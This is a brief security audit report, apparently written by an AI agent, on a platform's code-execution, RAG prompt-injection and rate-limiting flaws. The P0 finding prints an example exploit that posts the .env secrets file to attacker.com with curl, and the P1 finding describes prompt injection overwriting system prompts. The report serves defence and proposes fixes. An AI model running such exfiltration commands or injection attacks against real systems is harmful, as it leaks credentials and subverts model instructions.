# Security Audit
**Agent 3 — Staff Security Engineer**

## Hostile Review Results
The platform is currently trivial to exploit and destroy.

### Risk Classification
- **[P0] Remote Code Execution (RCE)**: `server.py` (Line ~1765). The `POST /api/dojo/submit` route executes arbitrary user-supplied Python code via `subprocess.run()`.
  - **Exploit**: `import os; os.system("curl -X POST -d @.env attacker.com")`.
  - **Impact**: Full compromise of the host machine, exfiltration of all LLM API keys and database credentials.
  - **Fix**: Run all dojo submissions in a gVisor-secured Docker container without network access. Effort: 2 weeks.

- **[P1] Prompt Injection in RAG**: `core/rag/` pipelines do not sanitize user inputs before feeding them to the LLM, allowing an attacker to overwrite system prompts and generate malicious architectural graphs.

- **[P2] Missing Rate Limiting**: Authentication endpoints are vulnerable to brute-forcing.
